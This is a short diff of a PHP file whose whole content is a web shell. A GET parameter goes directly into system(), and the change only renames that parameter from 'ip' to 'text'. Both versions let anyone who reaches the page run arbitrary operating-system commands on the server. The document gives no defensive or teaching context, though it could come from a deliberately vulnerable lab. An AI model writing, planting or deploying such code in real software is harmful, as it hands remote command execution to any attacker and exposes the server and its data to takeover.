@@ -1,4 +1,4 @@
 <?php
-$cmd = $_GET['ip'];
+$cmd = $_GET['text'];
 system($cmd);
 ?>
